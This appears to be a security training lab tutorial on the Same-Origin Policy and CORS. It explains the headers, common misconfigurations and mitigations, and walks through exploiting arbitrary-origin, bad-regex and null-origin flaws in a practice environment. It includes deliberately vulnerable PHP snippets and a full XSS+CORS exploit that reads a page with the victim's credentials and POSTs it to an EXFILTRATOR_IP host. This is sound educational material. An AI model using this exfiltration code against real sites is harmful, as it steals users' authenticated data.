# Introduction
---

Cross-Origin Resource Sharing, also known asÂ CORS, is a mechanism that allows web applications to request resources from different domains securely. This is crucial in web security as it prevents malicious scripts on one page from obtaining access to sensitive data on another web page through the browser.

Same-origin policy, also known asÂ SOP, is a security measure restricting web pages from interacting with resources from different origins. An origin is defined by the scheme (protocol), hostname (domain), and URL port.

#### Objectives

1. Understand the fundamental principles ofÂ CORSÂ andÂ SOP.
2. Identify and understand the security implications ofÂ CORSÂ andÂ SOPÂ configurations.
3. ExploitÂ CORSÂ andÂ SOP-related vulnerabilities in a controlled environment.
4. Understand and apply measures to mitigate and prevent these vulnerabilities.

#### Pre-requisites

1. Basic understanding of web application architecture and server-side scripting.
2. Familiarity with web server configurations andÂ [HTTP](https://tryhackme.com/room/httpindetail)Â headers.
3. Knowledge of JavaScript's XMLHttpRequest (XHR) or FetchÂ API.

# Understanding SOP
---

##### Same-Origin Policy

Same-origin policy orÂ SOPÂ is a policy that instructs how web browsers interact between web pages. According to this policy, a script on one web page can access data on another only if both pages share the same origin. This "origin" is identified by combining theÂ URIÂ scheme, hostname, and port number. The image below shows what a URL looks like with all its features (it does not use all features in every request).

![What URL looks like](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d721041f6137c9ea50cfa9b661cc1baa.png)

This policy is designed to prevent a malicious script on one page from accessing sensitive data on another web page through the browser.

#### Examples ofÂ SOP

1. **Same domain, different port**: A script fromÂ `https://test.com:80`Â can access data fromÂ `https://test.com:80/about`, as both share the same protocol, domain, and port. However, it cannot access data fromÂ `https://test.com:8080`Â due to a different port.
2. **HTTP/HTTPS interaction**: A script running onÂ `http://test.com`Â (non-secureÂ HTTP) is not allowed to access resources onÂ `https://test.com`Â (secure HTTPS), even though they share the same domain because the protocols are different.

#### Common Misconceptions

1. **Scope ofÂ SOP**: It's commonly misunderstood thatÂ SOPÂ only applies to scripts. In reality, it applies to all web page aspects, including embedded images, stylesheets, and frames, restricting how these resources interact based on their origins.
2. **SOPÂ Restricts All Cross-Origin Interactions**: Another misconception is thatÂ SOPÂ completely prevents all cross-origin interactions. WhileÂ SOPÂ does restrict specific interactions, modern web applications often leverage various techniques (likeÂ CORS, postMessage, etc.) to enable safe and controlled cross-origin communications.
3. **Same Domain Implies Same Origin**: People often think that if two URLs share the same domain, they are of the same origin. However,Â SOPÂ also considers protocol and port, so two URLs with the same domain but different protocols or ports are considered different origins.

#### SOPÂ Decision Process

![SOP decision process](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f750c8230ca04378b11f320d4b720640.png)  

The above flowchart illustrates the sequence of checks a browser performs underÂ SOP: it first checks if the protocols match, then the hostnames, and finally the port numbers. If all three match, the resource is allowed; otherwise, it is blocked. This diagram simplifies the concept, making it easier to understand and remember.

# Understanding CORS
---

#### Cross-Origin Resource Sharing

Cross-Origin Resource Sharing (CORS) is a mechanism defined byÂ HTTPÂ headers that allows servers to specify how resources can be requested from different origins. While the Same-Origin Policy (SOP) restricts web pages by default to making requests to the same domain,Â CORSÂ enables servers to declare exceptions to this policy, allowing web pages to request resources from other domains under controlled conditions.

CORSÂ operates through a set ofÂ HTTPÂ headers that the server sends as part of its response to a browser. These headers inform the browser about the server'sÂ CORSÂ policy, such as which origins are allowed to access the resources, whichÂ HTTPÂ methods are permitted, and whether credentials can be included with the requests. It's important to note that the server does not block or allow a request based onÂ CORS; instead, it processes the request and includesÂ CORSÂ headers in the response. The browser then interprets these headers and enforces theÂ CORSÂ policy by granting or denying the web page's JavaScript access to the response based on the specified rules.

#### DifferentÂ HTTPÂ Headers Involved inÂ CORS

1. **Access-Control-Allow-Origin**: This header specifies which domains are allowed to access the resources. For example,Â `Access-Control-Allow-Origin: example.com`Â allows only requests fromÂ `example.com`.
2. **Access-Control-Allow-Methods**: Specifies theÂ HTTPÂ methods (GET, POST, etc.) that can be used during the request.
3. **Access-Control-Allow-Headers**: Indicates whichÂ HTTPÂ headers can be used during the actual request.
4. **Access-Control-Max-Age**: Defines how long the results of a preflight request can be cached.
5. **Access-Control-Allow-Credentials**: This header instructs the browser whether to expose the response to the frontend JavaScript code when credentials like cookies,Â HTTPÂ authentication, or client-side SSL certificates are sent with the request. If Access-Control-Allow-Credentials is set to true, it allows the browser to access the response from the server when credentials are included in the request. It's important to note that when this header is used, Access-Control-Allow-Origin cannot be set to * and must specify an explicit domain to maintain security.

#### Common Scenarios WhereÂ CORSÂ is Applied

CORSÂ is commonly applied in scenarios such as:

1. **APIs and Web Services**: When a web application from one domain needs to access anÂ APIÂ hosted on a different domain,Â CORSÂ enables this interaction. For instance, a frontend application atÂ `example-client.com`Â might need to fetch data fromÂ `example-api.com`.
2. **Content Delivery Networks (CDNs)**: Many websites use CDNs to load libraries like jQuery or fonts.Â CORSÂ enables these resources to be securely shared across different domains.
3. **Web Fonts**: For web fonts to be used across different domains,Â CORSÂ headers must be set, allowing websites to load fonts from a centralized location.
4. **Third-Party Plugins/Widgets:**Â Enabling features like social media buttons or chatbots from external sources on a website.
5. **Multi-Domain User Authentication:**Â Services that offer single sign-on (SSO) or use tokens (like OAuth) to authenticate users across multiple domains rely onÂ CORSÂ to exchange authentication data securely.

#### Simple Requests vs. Preflight Requests

There are two primary types of requests inÂ CORS: simple requests and preflight requests.

1. **Simple Requests**: These requests meet certain criteria set byÂ CORSÂ that make them "simple". They are treated similarly to same-origin requests, with some restrictions. A request is considered simple if it uses the GET, HEAD, or POST method, and the POST request'sÂ `Content-Type`Â header is one ofÂ `application/x-www-form-urlencoded`,Â `multipart/form-data`, orÂ `text/plain`. Additionally, the request should not include custom headers that aren't CORS-safe listed. Simple requests are sent directly to the server with theÂ `Origin`Â header, and the response is subject toÂ CORSÂ policy enforcement based on theÂ `Access-Control-Allow-Origin`Â header. Importantly, cookies and HTTP authentication data are included in simple requests if the site has previously set such credentials, even without theÂ `Access-Control-Allow-Credentials`Â header being true.
    
2. **Preflight Requests**: These areÂ CORSÂ requests that the browser "preflights" with an OPTIONS request before sending the actual request to ensure that the server is willing to accept the request based on itsÂ CORSÂ policy. Preflight is triggered when the request does not qualify as a "simple request", such as when usingÂ HTTPÂ methods other than GET, HEAD, or POST, or when POST requests are made with anotherÂ `Content-Type`Â other than the allowed values for simple requests, or when custom headers are included. The preflight OPTIONS request includes headers likeÂ `Access-Control-Request-Method`Â andÂ `Access-Control-Request-Headers`, indicating the method and custom headers of the actual request. The server must respond with appropriate CORS headers, such asÂ `Access-Control-Allow-Methods`,Â `Access-Control-Allow-Headers`, andÂ `Access-Control-Allow-Origin`Â to indicate that the actual request is permitted. If the preflight succeeds, the browser will send the actual request with credentials included ifÂ `Access-Control-Allow-Credentials`Â is set to true.
    

#### Process of aÂ CORSÂ Request

![Process of CORS request](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/9eadd502f90ab196f359029a63494fbe.svg)  

The above flowchart shows the basic process of aÂ CORSÂ request.

1. The browser first sends anÂ HTTPÂ request to the server.
2. The server then checks the Origin header against its list of allowed origins.
3. If the origin is allowed, the server responds with the appropriateÂ `Access-Control-Allow-Origin`Â header.
4. The browser will block the cross-origin request if the origin is not allowed.

# ACAO in depth
---

#### Access-Control-Allow-Origin Header

The Access-Control-Allow-Origin orÂ ACAOÂ header is a crucial component of the Cross-Origin Resource Sharing (CORS) policy. It is used by servers to indicate whether the resources on a website can be accessed by a web page from a different origin. This header is part of theÂ HTTPÂ response provided by the server.

When a browser makes a cross-origin request, it includes the origin of the requesting site in theÂ HTTPÂ request. The server then checks this origin against itsÂ CORSÂ policy. If the origin is permitted, the server includes theÂ `Access-Control-Allow-Origin`Â header in the response, specifying either the allowed origin or a wildcard (`*`), which means any origin is allowed.

#### ACAOÂ Configurations

1. **Single Origin**:
    - Configuration:Â `Access-Control-Allow-Origin: https://example.com`
    - Implication: Only requests originating fromÂ `https://example.com`Â are allowed. This is a secure configuration, as it restricts access to a known, trusted origin.
2. **Multiple Origins**:
    - Configuration: Dynamically set based on a list of allowed origins.
    - Implication: Allows requests from a specific set of origins. While this is more flexible than a single origin, it requires careful management to ensure that only trusted origins are included.
3. **Wildcard Origin**:
    - Configuration:Â `Access-Control-Allow-Origin: *`
    - Implication: Permits requests from any origin. This is the least secure configuration and should be used cautiously. It's appropriate for publicly accessible resources that don't contain sensitive information.
4. **With Credentials**:
    - Configuration:Â `Access-Control-Allow-Origin`Â set to a specific origin (wildcards not allowed), along withÂ `Access-Control-Allow-Credentials: true`
    - Implication: Allows sending of credentials, such as cookies andÂ HTTPÂ authentication data, to be included in cross-origin requests. However, it's important to note that browsers will send cookies and authentication data without the Access-Control-Allow-Credentials header for simple requests like some GET and POST requests. For preflight requests that use methods other than GET/POST or custom headers, the Access-Control-Allow-Credentials header must beÂ **true**Â for the browser to send credentials.

#### ACAOÂ Flow

![Access-Control-Allow-Origin Flow](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/881dfef075517f43959632a99815ecf6.svg)  

The above flowchart shows a simplified server-side process for determining theÂ `Access-Control-Allow-Origin`Â header. Initially, it checks if theÂ HTTPÂ request contains an origin. If not, it sets a wildcard (`*`). If an origin is present, the server checks if this origin is in the list of allowed origins. If it is, the server sets theÂ ACAOÂ header to that specific origin; otherwise, it does not set theÂ ACAOÂ header, effectively denying access. This helps in visualizing the decision-making process behind theÂ CORSÂ policy implementation.


  
# Common Misconfigurations
----

#### CommonÂ CORSÂ Misconfigurations

CORSÂ misconfigurations can create significant security vulnerabilities in web applications. Understanding these common misconfigurations is crucial for both developers and security professionals. We will explore several typical misconfigurations and how they can be exploited.

1. **Null Origin Misconfiguration:**Â This occurs when a server accepts requests from the "null" origin. This can happen in scenarios where the origin of the request is not a standard browser environment, like from a file (`file://`) or a data URL.Â An attacker could craft aÂ phishingÂ email with a link to a malicious HTML file. When the victim opens the file, it can send requests to the vulnerable server, which incorrectly accepts these as coming from a 'null' origin. Servers should be configured to explicitly validate and not trust the 'null' origin unless necessary and understood.
2. **Bad Regex in Origin Checking:**Â Improperly configured regular expressions in origin checking can lead to accepting requests from unintended origins. For example, a regex likeÂ `/example.com$/`Â would mistakenly allowÂ `badexample.com`.Â An attacker could register a domain that matches the flawed regex and create a malicious site to send requests to the target server. Another example of lousy regex could be related to subdomains. For example, if domains starting withÂ `example.com`Â is allowed, an attacker could useÂ `example.com.attacker123.com`. The application should ensure that regex patterns used for validating origins are thoroughly tested and specific enough to exclude unintended matches.
3. **Trusting Arbitrary Supplied Origin:**Â Some servers are configured to echo back theÂ `Origin`Â header value in theÂ `Access-Control-Allow-Origin`Â response header, effectively allowing any origin.Â An attacker can craft a customÂ HTTPÂ request with a controlled origin. Since the server echoes this origin, the attacker's site can bypass theÂ SOPÂ restrictions. Instead of echoing back origins, maintain an allowlist of allowed origins and validate against it.

#### Secure Handling of Origin Checks

![Secure handling of origin checks](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d378a6adb3fe3a15bc9e64dbaa680a40.png)

The above flowchart shows a secure approach to handlingÂ CORSÂ requests. It first checks if the origin is 'null' and rejects such requests. If not, it checks whether the origin is in a predefined allowlist. If the origin is in the allowlist, the server setsÂ `Access-Control-Allow-Origin`Â to the origin and proceeds with the request. Otherwise, it rejects the request, ensuring only allowlisted origins are allowed. This method minimizes the risk ofÂ CORS-related vulnerabilities.

**Note:**Â It's essential to understand that "security" inÂ CORSÂ configurations is highly context-dependent. While using an allowlist and rejecting unspecified origins can enhance security, there are scenarios where settingÂ `Access-Control-Allow-Origin`Â toÂ `*`Â (allowing all origins) is a valid and secure choice. For example, publicly accessible resources that do not contain sensitive information and do not rely on cookies or authentication tokens for access control may safely use a wildcardÂ ACAOÂ header.


# Arbitrary Origin
---

#### Arbitrary Origin

Exploiting an Arbitrary Origin vulnerability is relatively easy compared to otherÂ CORSÂ vulnerabilities since the application accepts cross-origin requests from any domain name. For example, below is the vulnerable code ofÂ [http://corssop.thm/arbitrary.php](http://corssop.thm/arbitrary.php):

```php
if (isset($_SERVER['HTTP_ORIGIN'])){
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

The code above implements a flawedÂ CORSÂ policy since it echoes back theÂ `Origin`Â header from the client request in theÂ `Access-Control-Allow-Origin`Â header without proper validation.Â An attacker might use an origin likeÂ `http://evilcors.thm`Â and the server will echo it back.

![Server echo the supplied origin](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/abf822675dac1bfbafd2bbbb02594aba.png)  

To exploit the vulnerable code above, go toÂ [http://exploit.evilcors.thm](http://exploit.evilcors.thm/). The exploit server has an existing JavaScript code that makes cross-origin requests to the target application. The sample exploit code can be found atÂ [http://corssop.thm/exploits/data_exfil.html](http://corssop.thm/exploits/arbitrary.html). The exploit code usesÂ `XMLHttpRequest`Â to send requests to the vulnerable application and process the response. The processed response will be sent to the web server with the `receiver.php`Â file.

In the exploit code, change the target URL toÂ [http://corssop.thm/arbitrary.php](http://corssop.thm/arbitrary.php).

![change the target to arbitrary.php](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/faa8adc00361b57760fa969dd68beeaa.png)  

Also, change the URL of the web server that will receive the exfiltrated data. If you're using AttackBox, use the pattern ATTACKER_IP:81 sinceÂ ApacheÂ runs in port 81. Feel free to change the port if you're using your machine.

![Change the exfiltrator server](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/9ab9bd2af426a6c746cc93e57b58fd5e.png)  

Once done with the updates, click the Save button. To verify if the exploit is working, click theÂ **View exploit**Â button. This will open a new tab containing the exploit code saved in the hosting server.

In the newly open tab, open Developer tools > Network. There should be two XHR connections. The first request is sent to the target website, while the second is sent to the exfiltrating server.

![two XHR requests in the network tab](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/c971783cf5edbc13c3c80853944d3467.png)  

You can now click theÂ **Send to victim**Â button on the Exploit server's homepage.

**Note:**Â The victim will automatically visit the evil website containing the exploit code using the websiteÂ [http://evilcors.thm](http://evilcors.thm/).

To check if the victim has successfully executed the exploit code, check the exploit server's logs by clicking theÂ **Logs**Â button in the navigation bar. The logs should have a request from IPÂ **10.10.39.12**Â since this is the victim's IP address.Â 

![Server logs showing the victim interaction](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/ec2dff335090cdc761b5ef689a312501.png)  

In your exfiltrator server, you should receive a POST request from the victim. This POST request contains the whole webpage response of the first XHR request in our exploit.

**Note:**Â The IP differs from the previous image since the victim is simulated in an internal network. So, an outbound connection will use the IP of the machine instead.

![Outbound connection from the victim](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/51e8e4d4205a53d866cdf2763f93e725.png)  

OpenÂ **data.txt**Â located inÂ `/var/www/html`Â to view the exfiltrated data from the user.

![Exfiltrated data from victim](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/76f5f06cb3069d2df23eef69b3966bc6.png)  

In the real world, if the target response includes sensitive data like user data, tokens, andÂ APIÂ tokens, your JavaScript can capture this and potentially send it to a server under your control. To summarize, below is the entire process of the exploitation once the user clicks or visits the hosted exploit code:

![Process of exploitation](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/12e2121045eae59b895d54b8f00f6d1b.png)


# Bad Regex in Origin
---

Exploiting bad regular expressions (regex) inÂ CORSÂ origin handling is a technique that involves taking advantage of poorly implemented regex patterns used by web applications to validate origins inÂ CORSÂ headers. For example, below is the vulnerable code ofÂ [http://corssop.thm/badregex.php](http://corssop.thm/badregex.php):

```php
if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

The code above implements a flawedÂ CORSÂ policy since it validates domains that contain the wordÂ `corssop.thm`. An attacker might use an origin likeÂ `http://corssop.thm.evilcors.thm`Â that technically matches the pattern.

![supplied origin in the response](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6815765c9ea5422bf078964c9245f3b9.png)  

We can reuse the exploit code we used earlier to exploit the vulnerable code above. Just change the target URL toÂ [http://corssop.thm/badregex.php](http://corssop.thm/badregex.php). The exploit code can bypass theÂ CORSÂ since it's hosted inÂ [http://corssop.thm.evilcors.thm](http://corssop.thm.evilcors.thm/).

![change the target to badregex.php](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/09dd9972280f1ce4c80ec50951435e63.png)  

Once done with the updates, click the Save button again. To verify if the exploit is working, click theÂ View exploitÂ button. This will open a new tab containing the exploit code saved in the hosting server.

In the newly open tab, open Developer tools > Network. There should be two XHR connections. The first request is sent to the target website (badregex.php), while the second is sent to the exfiltrating server.

![XHR connections in the network tab](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/5e379f8f610d8f420823404ab2bb63ef.png)  

You can then send the exploit code to the victim by clicking theÂ Send to victimÂ button on the Exploit server's homepage.

Note: The victim will automatically go to the page containing the exploit code. However, in this scenario, the victim visits the domain name ([http://corssop.thm.evilcors.thm](http://corssop.thm.evilcors.thm/))Â instead of the previous domain name in Task 7.

To check if the victim has successfully executed the exploit code, check the exploit server's logs by clicking theÂ LogsÂ button in the navigation bar. The logs should have a request from IPÂ 10.10.39.12Â since this is the victim's IP address.Â 

![Server logs with victim interaction](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3386f7278f365d64da5c4a704ab2696c.png)  

In your exfiltrator server, you should receive a POST request from the victim. This POST request contains the whole webpage response of the first XHR request in our exploit.

Note:Â The IP differs from the previous image since the victim is simulated in an internal network. So, an outbound connection will use the IP of the machine instead.  

Once the request is saved, you can check the contents of the exfiltrated data in the text file.

![Exfiltrated data from the victim](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/01d3c77786fc09dd73995d3a0a8b0dfd.png)  

So, in a nutshell, below is the entire process of the exploitation once the user clicks or visits the hosted exploit code:

![Entire process of exploitation](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0451e7a3fc7b3cf9259fcfff90846915.png)

# Null Origin
---
#### Why Null Origin?

Allowing requests from the "null" origin in a web application'sÂ CORSÂ policy might seem counterintuitive, but there are specific scenarios where this might occur, either intentionally or due to misconfiguration. For example:

1. Local Files and Development: When developers test web applications locally usingÂ `file:///`Â URLs (e.g., opening an HTML file directly in a browser without a server), the browser typically sets the origin to "null". In such cases, developers might temporarily allow the "null" origin inÂ CORSÂ policies to facilitate testing.
2. Sandboxed Iframes: Web applications using sandboxed iframes (with theÂ `sandbox`Â attribute) might encounter "null" origins if the iframe's content comes from a different domain. The "null" origin is a security measure in highly restricted environments.
3. Specific Use Cases: Some applications might have particular use cases that need to support interactions from non-web-browser environments or unconventional clients that don't send a standard origin. Allowing the "null" origin might be a workaround, although it's generally not recommended due to security concerns.

#### Exploiting Null Origin

Compared to the previous techniques, exploiting a null origin vulnerability typically involves taking advantage of scenarios where an application incorrectly trusts the "null" origin of the request. This can happen when an application'sÂ CORSÂ policy is misconfigured to accept requests from the "null" origin. For example, below is the vulnerable code ofÂ [http://corssop.thm/null.php](http://corssop.thm/null.php):

```php
<?php
header('Access-Control-Allow-Origin: null');
header('Access-Control-Allow-Credentials: true');
?>
```

The "null" origin usually occurs when an HTML page is loaded locally using theÂ `file:///`Â protocol or inside an iframe.

![Null origin in the response](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/84dd592fc588146fe095dc5b5c3927c8.png)  

To exploit the vulnerable code above, an attacker can create a malicious webpage with an iframe containing a javascript code that makes cross-origin requests to the target application.

#### XSSÂ +Â CORS

We can use the vulnerable application atÂ [http://corssop.thm/xss.php](http://corssop.thm/xss.php)Â to chainÂ XSSÂ withÂ CORS. The application is designed to accept JavaScript or HTML code and then save it to the database. This means you can inject JavaScript or HTML code into the application, and once the victim visits the application, the payload will be executed.

![Sample XSS payload with a basic alert box](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/7014d79bc18957e4809e6dd67e23fd11.png)  

Below is a sample exploit code designed to exfiltrate the data from null.phpÂ while using the victim's session. Make sure to change the EXFILTRATOR_IP variable with your IP address.

```html
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
    <iframe id="exploitFrame" style="display:none;"></iframe>
    <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
  </div>

  <script>
    // JavaScript code for the exploit, adapted for inclusion in a data URL
    var exploitCode = `
      <script>
        function exploit() {
          var xhttp = new XMLHttpRequest();
          xhttp.open("GET", "http://corssop.thm/null.php", true);
          xhttp.withCredentials = true;
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              // Assuming you want to exfiltrate data to a controlled server
              var exfiltrate = function(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
                xhr.withCredentials = true;
                var body = data;
                var aBody = new Uint8Array(body.length);
                for (var i = 0; i < aBody.length; i++)
                  aBody[i] = body.charCodeAt(i);
                xhr.send(new Blob([aBody]));
              };
              exfiltrate(this.responseText);
            }
          };
          xhttp.send();
        }
        exploit();
      <\/script>
    `;

    // Encode the exploit code for use in a data URL
    var encodedExploit = btoa(exploitCode);

    // Set the iframe's src to the data URL containing the exploit
    document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
  </script>
```

TheÂ XSSÂ payload is executed when the victim interacts with the exploit (e.g., by visiting a link or viewing a maliciously crafted page).  

![XSS payload execution](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f03e577103570d56b2949cc82c976bc1.png)  

Open Developer tools > Network. There should be two XHR connections. The first request is sent to the target website (null.php), while the second is sent to the exfiltrating server.

![Two XHR connections in the network tab](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f076f0fb1274707ce73f3370d4c0c08c.png)

Since the server'sÂ CORSÂ policy is misconfigured to trust the "null" origin, it will respond to the request and include theÂ `Access-Control-Allow-Origin: null`Â header.  

![null origin in the request headers](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8a2e4db6ba54ac25179c83f268702c43.png)  

As you can see from the image below:

1. The domain name isÂ **corssop.thm**.
2. The origin isÂ **null**Â since the request originates from the iframe.

![null origin in the response](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f97cf877179bb26044ac6f61d6123558.png)  

The victim automatically visits the vulnerable application (xss.php) every minute, so once the updated exploit is saved, you should receive a POST request containing the flag from the victim.

OpenÂ **data.txt**Â located inÂ `/var/www/html`Â to view the exfiltrated data from the victim.

![exfiltrated data from the victim](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/4a1ba8421bdf42f9d3c727afca4b6396.png)

